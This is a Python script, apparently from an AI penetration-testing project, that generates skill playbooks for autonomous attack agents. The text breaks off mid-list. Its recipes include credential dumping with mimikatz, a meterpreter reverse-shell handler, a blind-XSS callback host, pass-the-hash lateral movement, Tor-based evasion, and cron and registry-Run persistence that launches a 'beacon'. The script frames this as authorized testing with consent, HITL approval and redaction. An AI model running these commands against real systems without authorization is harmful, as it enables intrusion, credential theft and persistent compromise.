"""
W11-S1: Generate 24 skill packages for VAPT-AI.

Each skill = a directory app/skills/<name>/SKILL.md following the agentskills.io
specification (same spec as CyberStrikeAI internal/skillpackage).

YAML frontmatter schema (port from CyberStrikeAI internal/skillpackage/types.go):
    name:           required
    description:    required
    license:        optional (default: apache-2.0)
    compatibility:  optional (e.g. ">=3.2")
    metadata:       optional map
        version:    e.g. "1.0.0"
        tags:       list[str]
        triggers:   list[str] (keyword triggers for auto-loading)
    allowed-tools:  optional (comma-separated tool list)

Output:
    app/skills/<name>/SKILL.md  (24 files)

Each skill body has 5 sections:
    - Overview
    - When to Use
    - Methodology (step-by-step playbook)
    - Tool Recipes (concrete commands)
    - Output Standards (WSTG / MITRE ATT&CK / CVSS formatting)

Run:
    python /home/z/my-project/vapt-ai/scripts/w11s1_generate_skill_packages.py
"""
from __future__ import annotations

import sys
from pathlib import Path
from textwrap import dedent

PROJECT_ROOT = Path(__file__).resolve().parent.parent
SKILLS_DIR = PROJECT_ROOT / "app" / "skills"


# ---------- 24 skill definitions ----------

SKILLS: list[dict] = [
    {
        "name": "web-attack-methods",
        "description": "OWASP WSTG web attack taxonomy — SQLi, XSS, RCE, LFI, IDOR, CSRF, SSRF playbook",
        "version": "1.0.0",
        "tags": ["web", "sqli", "xss", "rce", "lfi", "idor", "csrf", "ssrf"],
        "triggers": ["sql injection", "xss", "rce", "lfi", "idor", "csrf", "ssrf"],
        "allowed_tools": "nuclei,sqlmap,dalfox,nikto,wpscan",
        "agents": ["penetration", "vulnerability-triage"],
        "overview": "OWASP Web Security Testing Guide (WSTG v4.2) attack taxonomy. Covers the 7 main web attack classes: SQL Injection (WSTG-INPV-05), XSS (WSTG-INPV-02), RCE (WSTG-INPV-11), LFI/RFI (WSTG-INPV-12), IDOR (WSTG-ATHZ-04), CSRF (WSTG-SESS-05), SSRF (WSTG-INPV-19).",
        "when_to_use": "Use when target is a web application (HTTP/HTTPS). Especially for: form inputs, URL parameters, HTTP headers, JSON/XML API bodies, file upload endpoints. Loaded automatically by penetration + vulnerability-triage agents.",
        "methodology": [
            "1. Map attack surface (use attack-surface-recon skill results)",
            "2. For each input vector: test SQLi (sqlmap --batch --risk=3 --level=5)",
            "3. Test XSS (dalfox + manual payload injection)",
            "4. Test RCE/LFI (template injection, file inclusion via ffuf wordlists)",
            "5. Test IDOR (replace IDs in URL/JSON + observe responses)",
            "6. Test CSRF (token absence + SameSite cookie analysis)",
            "7. Test SSRF (URL parameter manipulation to internal hosts)",
            "8. For each finding: capture PoC, CVSS v3.1 vector, WSTG ID, MITRE ATT&CK technique",
        ],
        "tool_recipes": [
            "sqlmap -u 'http://target/page?id=1' --batch --risk=3 --level=5 --dbs",
            "dalfox url 'http://target/page?q=test' --blind 'https://hacker.xss.ht'",
            "nuclei -u http://target -t cves/2024/ -severity high,critical",
            "ffuf -u 'http://target/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401",
        ],
        "output_standards": "Each finding must include: WSTG ID (e.g. WSTG-INPV-05), CVSS v3.1 vector, MITRE ATT&CK technique (e.g. T1190), CWE ID, evidence (request/response), remediation. Use Sarif 2.1.0 for export.",
    },
    {
        "name": "post-exploitation",
        "description": "Post-exploitation playbook — GTFOBins, linpeas workflow, mimikatz, post modules",
        "version": "1.0.0",
        "tags": ["post-exploit", "privesc", "mimikatz", "linpeas", "gtfobins"],
        "triggers": ["post-exploitation", "privesc", "credential dumping", "persistence"],
        "allowed_tools": "linpeas,winpeas,mimikatz,metasploit",
        "agents": ["penetration", "privilege-escalation", "impact-exfiltration"],
        "overview": "Post-exploitation methodology after initial foothold. Linux (linpeas → GTFOBins → cron abuse) + Windows (winpeas → mimikatz → token impersonation). Aligned with MITRE ATT&CK Tactics TA0004 (Privilege Escalation), TA0006 (Credential Access), TA0008 (Collection).",
        "when_to_use": "After initial shell access. Triggered by: shell session on target, C2 beacon online, webshell uploaded. Loaded by penetration, privilege-escalation, and impact-exfiltration agents.",
        "methodology": [
            "1. Enumerate privilege escalation paths (linpeas/winpeas)",
            "2. Check GTFOBins for SUID binaries (Linux) or unquoted service paths (Windows)",
            "3. Dump credentials (mimikatz sekurlsa::logonpasswords on Windows)",
            "4. Search for stored credentials (config files, registry, browser stores)",
            "5. Identify lateral movement opportunities (shared credentials, SSH keys)",
            "6. Capture evidence: full command output, hashes redacted via app/pii/redactor.py",
        ],
        "tool_recipes": [
            "linpeas.sh -a 2>/dev/null | tee linpeas_output.txt",
            "winpeas.exe (run on Windows host)",
            "mimikatz.exe 'sekurlsa::logonpasswords' exit",
            "metasploit: post/windows/gather/credentials/credential_collector",
        ],
        "output_standards": "Capture: command + raw output (PII redacted), MITRE ATT&CK technique (e.g. T1003 for LSASS), evidence hash. NEVER store cleartext credentials in audit log — always redact via app/pii/redactor.py.",
    },
    {
        "name": "redteam-opsec",
        "description": "Red team OPSEC — low-noise testing, blue-team evasion considerations",
        "version": "1.0.0",
        "tags": ["opsec", "redteam", "evasion", "low-noise"],
        "triggers": ["opsec", "evasion", "low noise", "blue team"],
        "allowed_tools": "",
        "agents": ["opsec-evasion", "persistence-maintenance"],
        "overview": "Operational Security (OPSEC) considerations for red team engagements. Advisory only — does NOT provide WAF bypass or AV evasion techniques (out of scope for VAPT-AI MVP). Covers: timing, payload encoding, log cleanup, blue-team detection surface.",
        "when_to_use": "Before + during active exploitation. Loaded by opsec-evasion agent as advisory context.",
        "methodology": [
            "1. Slow scan timing (nmap -T2 to evade IDS)",
            "2. Rotate User-Agent + randomize delays between requests",
            "3. Avoid peak business hours for noisy scans",
            "4. Use proxychains + Tor for anonymous enumeration",
            "5. Document every action for cleanup (cleanup-rollback skill)",
            "6. NEVER attempt to disable EDR/AV — out of scope",
        ],
        "tool_recipes": [
            "nmap -T2 --max-rate 50 -sS -p 1-1000 target",
            "ffuf -u 'http://target/FUZZ' -w wordlist.txt -rate 10",
            "sqlmap --delay=5 --random-agent --time-sec=15",
        ],
        "output_standards": "OPSEC recommendations documented as advisory notes. NO actual bypass techniques. Map to MITRE ATT&CK T1070 (Indicator Removal) only for cleanup procedures.",
    },
    {
        "name": "attack-surface-recon",
        "description": "Recon methodology — nmap workflow, subdomain enumeration, port/service mapping",
        "version": "1.0.0",
        "tags": ["recon", "nmap", "subdomain", "ports", "services"],
        "triggers": ["recon", "port scan", "subdomain", "fingerprint"],
        "allowed_tools": "nmap,httpx,whatweb,masscan,rustscan,subfinder,amass,dnsenum,fierce,gau,waybackurls",
        "agents": ["recon", "intel-collection", "attack-surface-enumeration"],
        "overview": "Reconnaissance methodology following PTES (Penetration Testing Execution Standard) Intelligence Gathering phase. Covers: passive OSINT, active port scanning, service fingerprinting, subdomain enumeration.",
        "when_to_use": "Always — first phase of every scan. Loaded by recon, intel-collection, attack-surface-enumeration agents.",
        "methodology": [
            "1. Passive OSINT (theHarvester for emails, subfinder/amass for subdomains)",
            "2. DNS recon (dnsenum + fierce for zone transfers + DNS records)",
            "3. Historical URLs (gau + waybackurls for past endpoints)",
            "4. Active port scan (nmap -sS -sV --top-ports 1000)",
            "5. Service fingerprint (httpx for HTTP tech, whatweb for stack)",
            "6. Persist findings to PentestFact blackboard (target/<host>)",
        ],
        "tool_recipes": [
            "theharvester -d example.com -b all -f recon.html",
            "subfinder -d example.com -all -recursive -o subdomains.txt",
            "nmap -sS -sV --top-ports 1000 -oA nmap_full 192.168.1.0/24",
            "httpx -l hosts.txt -title -tech-detect -status-code",
        ],
        "output_standards": "For each discovered asset: IP/hostname, open ports, service+version, tech stack. Map to MITRE ATT&CK T1595 (Active Scanning) + T1592 (Gather Victim Host Info).",
    },
    {
        "name": "source-code-hunting",
        "description": "Source code review for vulnerabilities (SAST) — pattern matching + taint analysis",
        "version": "1.0.0",
        "tags": ["sast", "code-review", "static-analysis"],
        "triggers": ["source code", "code review", "sast"],
        "allowed_tools": "",
        "agents": ["vulnerability-triage", "attack-surface-enumeration"],
        "overview": "Static Application Security Testing (SAST) methodology. Reviews source code for common vulnerability patterns: SQLi (string concat), XSS (unescaped output), hardcoded secrets, insecure deserialization, path traversal.",
        "when_to_use": "When source code is available (white-box or grey-box pentest). Loaded by vulnerability-triage + attack-surface-enumeration agents.",
        "methodology": [
            "1. Identify tech stack (Python/PHP/Node/Java) — use whatweb output",
            "2. Search for common sink patterns: eval, exec, system, unescape, pickle.loads",
            "3. Trace user input to sinks (taint analysis)",
            "4. Check for hardcoded secrets (grep -r 'password=' 'api_key=')",
            "5. Identify outdated dependencies (CVE scanning via component-vuln-intel skill)",
            "6. Verify findings dynamically (manual PoC + tool validation)",
        ],
        "tool_recipes": [
            "grep -rn 'eval\\|exec\\|system' --include='*.py' .",
            "grep -rn 'mysqli_query\\|mysql_query' --include='*.php' .",
            "grep -rn 'innerHTML\\|dangerouslySetInnerHTML' --include='*.js' .",
            "grep -rE '(password|api_key|secret)\\s*=' .",
        ],
        "output_standards": "Each finding: source file + line, vulnerable pattern, taint path (source → sink), CWE ID, suggested fix. Use MITRE ATT&CK T1027 (Obfuscated Files) for anti-pattern detection.",
    },
    {
        "name": "component-vuln-intel",
        "description": "Component fingerprinting + CVE matching (NVD lookup workflow)",
        "version": "1.0.0",
        "tags": ["cve", "nvd", "components", "dependencies"],
        "triggers": ["cve", "component", "dependency", "version"],
        "allowed_tools": "nuclei,nikto,whatweb,httpx",
        "agents": ["vulnerability-triage", "intel-collection"],
        "overview": "Third-party component vulnerability intelligence. Identifies software versions → matches against NVD CVE database → produces prioritized finding list.",
        "when_to_use": "After recon phase identifies tech stack. Loaded by vulnerability-triage + intel-collection agents.",
        "methodology": [
            "1. Fingerprint components (whatweb for web stack, nuclei -t technologies)",
            "2. For each component+version: query NVD API (app/core/cve_client.py)",
            "3. Filter CVEs by CVSS severity (>=7.0 high, >=9.0 critical)",
            "4. Verify CVE applies (some require specific configs)",
            "5. For verified CVEs: capture PoC + remediation (upgrade version)",
            "6. Persist to blackboard as candidate_finding",
        ],
        "tool_recipes": [
            "whatweb -a 3 http://target",
            "nuclei -u http://target -t technologies/ -severity medium,high,critical",
            "curl 'https://services.nvd.nist.gov/rest/json/cves/2.0?cpeName=cpe:2.3:a:apache:http_server:2.4.41'",
        ],
        "output_standards": "Each CVE finding: CVE ID, CVSS v3.1 vector + score, affected version, patched version, exploitability (PoC available?), remediation (upgrade to X).",
    },
    {
        "name": "capability-primitive-search",
        "description": "Capability primitive search — Wappalyzer-style tech stack + capability discovery",
        "version": "1.0.0",
        "tags": ["wappalyzer", "capabilities", "tech-stack"],
        "triggers": ["capabilities", "tech stack", "wappalyzer"],
        "allowed_tools": "whatweb,httpx,wpscan",
        "agents": ["attack-surface-enumeration", "penetration"],
        "overview": "Capability primitive search identifies the underlying technology stack + capabilities of a target. Used to narrow down attack surface to known-vulnerable tech.",
        "when_to_use": "After recon identifies HTTP endpoints. Loaded by attack-surface-enumeration + penetration agents.",
        "methodology": [
            "1. Use whatweb for fingerprinting (server, framework, CMS, language)",
            "2. Probe common endpoints (/admin, /api, /robots.txt, /sitemap.xml)",
            "3. Identify authentication mechanism (cookie, JWT, basic auth)",
            "4. Identify session management (cookie names, JWT claims)",
            "5. Map capabilities to attack paths (e.g. WordPress → wpscan)",
            "6. Persist findings to PentestFact blackboard (infra/ category)",
        ],
        "tool_recipes": [
            "whatweb -a 3 -v http://target",
            "httpx -title -tech-detect -status-code -follow-redirects",
            "wpscan --url http://target --enumerate ap,at,u --random-user-agent",
        ],
        "output_standards": "Each capability: technology name, version, confidence, detected endpoints, suggested attack paths.",
    },
    {
        "name": "pentest-agent-os",
        "description": "Pentest agent operating system — engagement lifecycle + scope management",
        "version": "1.0.0",
        "tags": ["engagement", "scope", "lifecycle", "roe"],
        "triggers": ["engagement", "scope", "rules of engagement"],
        "allowed_tools": "",
        "agents": ["engagement-planning", "reporting-remediation"],
        "overview": "Engagement lifecycle management — Rules of Engagement (ROE), scope definition, success criteria, evidence chain handoff. Aligns with PTES Preparation + Reporting phases.",
        "when_to_use": "At engagement start + report handoff. Loaded by engagement-planning + reporting-remediation agents.",
        "methodology": [
            "1. Define ROE (in-scope, out-of-scope, time window, contact info)",
            "2. Verify authorization (ConsentForm with declared_scope_json)",
            "3. Set success criteria (e.g. 'discover 5+ exploitable vulns')",
            "4. Track engagement timeline (start, mid-point check, end)",
            "5. Handoff evidence chain to reporting agent at engagement end",
            "6. Conduct retrospective (what worked, what didn't)",
        ],
        "tool_recipes": [
            "POST /api/consent (create consent form with declared scope)",
            "GET /api/scans/{scan_id}/blackboard (review accumulated facts)",
        ],
        "output_standards": "Engagement plan document: ROE, scope, success criteria, timeline, contact list, evidence chain reference. Map to PTES phases.",
    },
    {
        "name": "pentest-blackboard",
        "description": "PentestFact blackboard patterns + fact taxonomy",
        "version": "1.0.0",
        "tags": ["blackboard", "facts", "shared-state"],
        "triggers": ["blackboard", "fact", "shared state"],
        "allowed_tools": "",
        "agents": ["reporting-remediation", "attack-surface-enumeration"],
        "overview": "PentestFact blackboard patterns — fact taxonomy (asset, candidate_finding, exploited_finding, session, lateral_path, impact_evidence, cleanup_action) + write patterns + supersession rules.",
        "when_to_use": "Whenever an agent discovers a fact worth persisting. Loaded by reporting-remediation + attack-surface-enumeration agents.",
        "methodology": [
            "1. Choose fact_type from FACT_TYPES tuple",
            "2. Generate fact_key as 'category/slug' (e.g. 'target/primary_domain')",
            "3. Write fact_value as JSONB (structured, not free text)",
            "4. Set confidence (0.0-1.0) based on evidence strength",
            "5. Use upsert_fact() (auto-supersedes old fact with same key)",
            "6. Cross-reference related findings via related_vulnerability_id",
        ],
        "tool_recipes": [
            "Blackboard.add_fact(scan_id, 'asset', 'asset:192.168.1.5:22', {...}, source_agent='recon', confidence=0.95)",
            "Blackboard.get_facts_by_type(scan_id, 'exploited_finding')",
        ],
        "output_standards": "Fact format: fact_type, fact_key (unique per scan), fact_value (JSONB), source_agent, confidence, created_at, superseded_by (None if active).",
    },
    {
        "name": "pentest-output-standards",
        "description": "Output standards — CVSS v3.1, WSTG IDs, MITRE ATT&CK technique formatting",
        "version": "1.0.0",
        "tags": ["cvss", "wstg", "mitre", "sarif"],
        "triggers": ["cvss", "wstg", "mitre", "sarif", "formatting"],
        "allowed_tools": "",
        "agents": ["reporting-remediation"],
        "overview": "Output formatting standards for findings: CVSS v3.1 vector string, OWASP WSTG v4.2 IDs, MITRE ATT&CK technique IDs, SARIF 2.1.0 export format.",
        "when_to_use": "At finding report time. Loaded by reporting-remediation agent.",
        "methodology": [
            "1. Calculate CVSS v3.1 vector (AV/AC/PR/UI/S/C/I/A) using cvss lib",
            "2. Assign WSTG ID from catalog (e.g. WSTG-INPV-05 for SQLi)",
            "3. Map to MITRE ATT&CK technique (e.g. T1190 Exploit Public-Facing App)",
            "4. Assign CWE ID (e.g. CWE-89 for SQLi)",
            "5. Format evidence chain (5-layer: detection → validation → exploitation → post-exploitation → audit)",
            "6. Export as SARIF 2.1.0 JSON for tool interoperability",
        ],
        "tool_recipes": [
            "from app.evidence.cvss import calculate_cvss; calculate_cvss('AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')",
            "from app.report.sarif_exporter import export_sarif (W20)",
        ],
        "output_standards": "Each finding: title, description, severity (CVSS score), CVSS vector, WSTG ID, MITRE technique, CWE ID, evidence chain, remediation, disclosure window (ISO 29147).",
    },
    {
        "name": "pentest-verification",
        "description": "Verification methodology — 5-strategy verifier (FP filtering)",
        "version": "1.0.0",
        "tags": ["verification", "fp-filtering", "false-positive"],
        "triggers": ["verification", "false positive", "fp"],
        "allowed_tools": "",
        "agents": ["vulnerability-triage", "penetration"],
        "overview": "Verification methodology with 5 strategies: security headers, server disclosure, cookie security, XSS reflection, info disclosure. Filters false positives via independent re-probing.",
        "when_to_use": "After candidate finding detection, before recording as exploited_finding. Loaded by vulnerability-triage + penetration agents.",
        "methodology": [
            "1. For each candidate finding: run independent verification probe",
            "2. Strategy 1: security headers (curl -I + parse)",
            "3. Strategy 2: server disclosure (header Server: value)",
            "4. Strategy 3: cookie security (HttpOnly, Secure, SameSite)",
            "5. Strategy 4: XSS reflection (manual payload + observe)",
            "6. Strategy 5: info disclosure (error messages, debug pages)",
            "7. Calculate confidence score: 0.35*Evidence + 0.25*Reasoning + 0.30*Verification + 0.10*Historical",
            "8. If confidence < 0.6: reject as false positive",
        ],
        "tool_recipes": [
            "curl -sI http://target | grep -iE 'strict-transport-security|x-frame-options|x-content-type-options'",
            "app/harness/verifier.py (W12 — full implementation)",
        ],
        "output_standards": "Verification verdict: confirmed (confidence >= 0.6), rejected (confidence < 0.6), needs_more_evidence (insufficient probe). Record verifier strategy used.",
    },
    {
        "name": "unlimited-attack-scope",
        "description": "Full kill-chain playbook — exploit → privesc → lateral → impact",
        "version": "1.0.0",
        "tags": ["kill-chain", "full-scope", "lateral"],
        "triggers": ["kill chain", "full scope", "lateral movement"],
        "allowed_tools": "sqlmap,metasploit,mimikatz,netexec,impacket,responder",
        "agents": ["penetration", "lateral-movement"],
        "overview": "Full kill-chain playbook following MITRE ATT&CK Framework: Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Exfiltration → Impact.",
        "when_to_use": "For plan_execute mode (full kill-chain scan). Loaded by penetration + lateral-movement agents.",
        "methodology": [
            "1. Initial access (exploit web vuln via web-attack-methods)",
            "2. Execution (run shell command on target)",
            "3. Privilege escalation (use post-exploitation skill)",
            "4. Credential access (mimikatz, /etc/shadow dump)",
            "5. Discovery (internal network scan with masscan)",
            "6. Lateral movement (pass-the-hash, Kerberos tickets via impacket)",
            "7. Collection (identify high-value targets — DC, file servers)",
            "8. Impact proof (use impact-proof-methodology skill)",
            "9. Cleanup (use cleanup-rollback-procedures skill)",
        ],
        "tool_recipes": [
            "metasploit: use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "impacket-smbexec user:password@target",
            "netexec smb 192.168.1.0/24 -u user -p password --shares",
        ],
        "output_standards": "Each kill-chain step: MITRE ATT&CK technique ID, evidence (command + output), affected systems, chain link to next step.",
    },
    {
        "name": "network-recon-methodology",
        "description": "Network-level recon — SMB, Kerberos, AD enumeration",
        "version": "1.0.0",
        "tags": ["network", "smb", "kerberos", "ad"],
        "triggers": ["network scan", "smb", "kerberos", "active directory"],
        "allowed_tools": "nmap,masscan,rustscan,netexec,impacket,enum4linux-ng,responder",
        "agents": ["recon", "intel-collection"],
        "overview": "Network-level recon methodology — SMB enumeration (shares, sessions), Kerberos (user enum via GetUserSPNs.py), Active Directory (BloodHound graph). For internal network pentest.",
        "when_to_use": "When target is an internal network (not just web app). Loaded by recon + intel-collection agents.",
        "methodology": [
            "1. Host discovery (nmap -sn for live hosts)",
            "2. Port scan (nmap -sS -p 445,88,389,636 for AD)",
            "3. SMB enum (netexec smb --shares, enum4linux-ng)",
            "4. Kerberos user enum (GetUserSPNs.py -usersfile users.txt)",
            "5. AD graph (bloodhound-python -u user -p pass -d domain.local -c All)",
            "6. Identify high-value targets (DC, SQL servers, admin workstations)",
        ],
        "tool_recipes": [
            "nmap -sn 192.168.1.0/24 -oA hosts",
            "netexec smb 192.168.1.0/24 --shares -u '' -p ''",
            "bloodhound-python -u user -p pass -d domain.local -c All -ns 192.168.1.1",
            "impacket-GetUserSPNs.py domain.local/user:pass -request",
        ],
        "output_standards": "Map findings to MITRE ATT&CK T1018 (Remote System Discovery), T1087 (Account Discovery), T1069 (Permission Groups Discovery). Persist AD graph for lateral-movement agent.",
    },
    {
        "name": "web-fingerprinting",
        "description": "Web tech fingerprinting — whatweb + wappalyzer-style stack detection",
        "version": "1.0.0",
        "tags": ["fingerprint", "wappalyzer", "whatweb", "tech-detect"],
        "triggers": ["fingerprint", "tech stack", "whatweb"],
        "allowed_tools": "whatweb,httpx,wpscan,nuclei",
        "agents": ["attack-surface-enumeration", "recon"],
        "overview": "Web technology fingerprinting via HTTP headers + HTML patterns. Identifies: web server (Apache/Nginx), framework (Django/Express/Laravel), CMS (WordPress/Drupal), JS libraries (jQuery/React).",
        "when_to_use": "After HTTP endpoint discovery. Loaded by attack-surface-enumeration + recon agents.",
        "methodology": [
            "1. Fetch headers (curl -sI) — look for Server, X-Powered-By, X-Generator",
            "2. Analyze HTML <head> (meta generator, script src, link href)",
            "3. Probe common paths (/wp-admin, /admin, /server-status)",
            "4. Use whatweb -a 3 for aggressive detection",
            "5. Use nuclei -t technologies/ for additional fingerprinting",
            "6. Cross-reference with component-vuln-intel skill for CVE matching",
        ],
        "tool_recipes": [
            "whatweb -a 3 -v http://target",
            "curl -sI http://target | grep -iE 'server|x-powered|x-generator'",
            "nuclei -u http://target -t technologies/ -severity info,low",
        ],
        "output_standards": "Each detected tech: name, version, confidence (%), source (header/HTML/path), detected endpoints. Persist to PentestFact blackboard as 'infra/' category.",
    },
    {
        "name": "api-security-testing",
        "description": "REST/GraphQL API pentest methodology — OWASP API Top 10",
        "version": "1.0.0",
        "tags": ["api", "rest", "graphql", "owasp-api"],
        "triggers": ["api", "rest", "graphql", "openapi"],
        "allowed_tools": "nuclei,nikto,sqlmap,ffuf,arjun",
        "agents": ["vulnerability-triage", "penetration"],
        "overview": "API security testing per OWASP API Security Top 10 (2023): BOLA, Broken Authentication, Excessive Data Exposure, Lack of Rate Limiting, Broken Function Level Authorization, Mass Assignment, SSRF, Improper Inventory, Unsafe API Consumption.",
        "when_to_use": "When target exposes an API (REST or GraphQL). Loaded by vulnerability-triage + penetration agents.",
        "methodology": [
            "1. Discover API endpoints (OpenAPI spec at /openapi.json, /swagger.json, /docs)",
            "2. Map parameters (use arjun for hidden params)",
            "3. Test BOLA (replace object IDs in URL/body)",
            "4. Test broken auth (missing JWT, expired token, weak signatures)",
            "5. Test rate limiting (send 100 requests/sec, observe response)",
            "6. Test GraphQL (introspection query, batch attacks)",
            "7. Test SSRF (URL parameters pointing to internal services)",
        ],
        "tool_recipes": [
            "ffuf -u 'http://target/api/FUZZ' -w api_endpoints.txt -mc 200,201,401,403",
            "arjun -u http://target/api/v1/users",
            "nuclei -u http://target -t exposures/apis/",
            "graphw00f -t http://target/graphql",
        ],
        "output_standards": "Each finding: OWASP API Top 10 category (e.g. API1:2023-BOLA), HTTP method, endpoint, evidence (request/response), remediation.",
    },
    {
        "name": "auth-bypass-methods",
        "description": "Auth bypass techniques — JWT, OAuth, session manipulation",
        "version": "1.0.0",
        "tags": ["auth", "jwt", "oauth", "session"],
        "triggers": ["authentication", "jwt", "oauth", "session"],
        "allowed_tools": "nuclei,sqlmap,ffuf",
        "agents": ["penetration", "vulnerability-triage"],
        "overview": "Authentication bypass methods: JWT manipulation (alg:none, key confusion), OAuth flow abuse, session fixation/prediction, brute force, credential stuffing.",
        "when_to_use": "When target has login/auth endpoints. Loaded by penetration + vulnerability-triage agents.",
        "methodology": [
            "1. Identify auth mechanism (cookie, JWT, basic auth)",
            "2. JWT analysis: decode header/payload, test alg:none, brute key",
            "3. Session analysis: predict session IDs, test fixation",
            "4. Brute force (use ffuf with username/password wordlists)",
            "5. OAuth: check redirect_uri, state CSRF, scope escalation",
            "6. MFA bypass: replay OTP, test race conditions",
        ],
        "tool_recipes": [
            "jwt_tool '<JWT_TOKEN>' -C -d /usr/share/wordlists/rockyou.txt",
            "ffuf -u 'http://target/login' -X POST -d 'user=FUZZ&pass=admin' -w users.txt",
            "nuclei -u http://target -t exposures/files/jwt-secret-key.yaml",
        ],
        "output_standards": "Each finding: auth mechanism, bypass technique, MITRE ATT&CK T1078 (Valid Accounts), evidence (request/response), remediation.",
    },
    {
        "name": "privilege-escalation-methods",
        "description": "Linux + Windows privesc methodology — GTFOBins + winPEAS workflow",
        "version": "1.0.0",
        "tags": ["privesc", "linux", "windows", "gtfobins"],
        "triggers": ["privilege escalation", "privesc", "root", "admin"],
        "allowed_tools": "linpeas,winpeas,mimikatz",
        "agents": ["privilege-escalation"],
        "overview": "Privilege escalation methodology — Linux (SUID/GTFOBins/cron/capabilities) + Windows (service paths/registry/SeImpersonate). Maps to MITRE ATT&CK TA0004 (Privilege Escalation).",
        "when_to_use": "After initial shell as low-priv user. Loaded by privilege-escalation agent.",
        "methodology": [
            "1. Run linpeas (Linux) or winpeas (Windows) — automated enum",
            "2. Identify SUID binaries → check GTFOBins for exploitation",
            "3. Check sudo permissions (sudo -l)",
            "4. Cron job abuse (cron.d, /etc/crontab, user crons)",
            "5. Linux capabilities (getcap -r / 2>/dev/null)",
            "6. Windows: unquoted service paths, writable service binPath",
            "7. Windows: SeImpersonate abuse (JuicyPotato, PrintSpoofer)",
            "8. Capture before/after uid evidence (id; whoami /priv)",
        ],
        "tool_recipes": [
            "linpeas.sh -a 2>/dev/null | tee linpeas.txt",
            "winpeas.exe (or winPEASx64.exe)",
            "find / -perm -4000 -type f 2>/dev/null  # SUID",
            "getcap -r / 2>/dev/null  # Linux capabilities",
        ],
        "output_standards": "Each privesc path: technique (GTFOBins link or MITRE technique ID), original uid, escalated uid, command output, MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).",
    },
    {
        "name": "lateral-movement-methods",
        "description": "Lateral movement — SMB, WMI, Kerberos, RDP, pass-the-hash",
        "version": "1.0.0",
        "tags": ["lateral", "smb", "wmi", "kerberos", "rdp", "pth"],
        "triggers": ["lateral movement", "pass the hash", "kerberos"],
        "allowed_tools": "netexec,impacket,responder",
        "agents": ["lateral-movement", "persistence-maintenance"],
        "overview": "Lateral movement techniques: SMB (PsExec, smbexec), WMI (wmiexec), Kerberos (pass-the-ticket, overpass-the-hash), RDP. Maps to MITRE ATT&CK TA0008 (Lateral Movement).",
        "when_to_use": "After obtaining valid credentials or session. Loaded by lateral-movement + persistence-maintenance agents.",
        "methodology": [
            "1. Validate credentials (netexec smb --continue-on-success)",
            "2. Identify accessible hosts (netexec smb 192.168.1.0/24)",
            "3. Identify admin shares (netexec --shares)",
            "4. Execute via PsExec (impacket-psexec user:pass@target)",
            "5. Or via WMI (impacket-wmiexec user:pass@target)",
            "6. Kerberos: pass-the-ticket (Rubeus, ticketConverter.py)",
            "7. RDP: if open, use restricted-admin mode with PTH",
            "8. Document each hop in attack chain (PentestFact lateral_path)",
        ],
        "tool_recipes": [
            "netexec smb 192.168.1.0/24 -u user -p pass --continue-on-success",
            "impacket-psexec domain.local/user:pass@192.168.1.10",
            "impacket-wmiexec domain.local/user:pass@192.168.1.10",
            "impacket-ticketer.py -nthash <hash> -domain local -user admin -spn cifs/dc01.domain.local",
        ],
        "output_standards": "Each lateral hop: source host, target host, technique (MITRE ATT&CK T1021 Remote Services), credentials used (hash redacted), command output.",
    },
    {
        "name": "persistence-techniques",
        "description": "Persistence mechanisms + cleanup procedures",
        "version": "1.0.0",
        "tags": ["persistence", "scheduled-task", "service", "registry"],
        "triggers": ["persistence", "backdoor", "scheduled task"],
        "allowed_tools": "metasploit",
        "agents": ["persistence-maintenance", "cleanup-rollback"],
        "overview": "Persistence mechanisms: Linux (cron, systemd service, SSH keys, bashrc) + Windows (scheduled task, service, registry Run key, WMI subscription). Maps to MITRE ATT&CK TA0003 (Persistence).",
        "when_to_use": "After obtaining persistent access is desired (HITL approved). Loaded by persistence-maintenance + cleanup-rollback agents.",
        "methodology": [
            "1. Choose persistence mechanism (HITL approval required)",
            "2. Linux: cron job, systemd service, SSH authorized_keys, bashrc",
            "3. Windows: scheduled task, service, Run registry key, WMI subscription",
            "4. Document persistence details (path, trigger, cleanup command)",
            "5. Test persistence (reboot target, verify access survives)",
            "6. ALWAYS create cleanup procedure alongside installation",
            "7. Persist cleanup procedure in PentestFact (cleanup_action)",
        ],
        "tool_recipes": [
            "metasploit: post/windows/manage/persistence_exe (with REXEC, REGRUN, SCHTASK options)",
            "echo '* * * * * /tmp/beacon' | crontab -",
            "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v Update /t REG_SZ /d 'C:\\Users\\Public\\beacon.exe'",
        ],
        "output_standards": "Each persistence: mechanism, path/registry key, trigger (boot/login/scheduled), cleanup command, MITRE ATT&CK technique (e.g. T1053 Scheduled Task). Cleanup MUST be documented before installation.",
    },
    {
        "name": "impact-proof-methodology",
        "description": "Business impact proof without data exfiltration",
        "version": "1.0.0",
        "tags": ["impact", "exfiltration", "business"],
        "triggers": ["impact", "exfiltration", "business"],
        "allowed_tools": "metasploit",
        "agents": ["impact-exfiltration", "reporting-remediation"],
        "overview": "Business impact proof methodology — demonstrates accessibility of sensitive data WITHOUT actual exfiltration. Emphasizes PII redaction via app/pii/redactor.py.",
        "when_to_use": "To prove business impact of exploited vulnerabilities. Loaded by impact-exfiltration + reporting-remediation agents.",
        "methodology": [
            "1. Identify high-value targets (databases, file servers, admin panels)",
            "2. Demonstrate accessibility (count records, NOT dump them)",
            "3. NEVER actually exfiltrate data — only prove accessibility",
            "4. Redact all PII via app/pii/redactor.py before storing evidence",
            "5. Capture: count of accessible records, sample (1 record, PII redacted)",
            "6. Map to MITRE ATT&CK TA0009 (Collection), TA0010 (Exfiltration) — but with NO exfiltration",
        ],
        "tool_recipes": [
            "metasploit: post/windows/gather/credentials/credential_collector",
            "sqlmap --count (instead of --dump)",
            "app/pii/redactor.py for scrubbing output",
        ],
        "output_standards": "Impact proof: accessible resource count, sample (redacted), accessibility method, MITRE ATT&CK technique. NO actual data exfiltration. PII redaction is MANDATORY.",
    },
    {
        "name": "evidence-collection-standards",
        "description": "Evidence chain of custody — HMAC seals, 5-layer chain",
        "version": "1.0.0",
        "tags": ["evidence", "custody", "hmac", "chain"],
        "triggers": ["evidence", "custody", "hmac", "tamper"],
        "allowed_tools": "",
        "agents": ["reporting-remediation"],
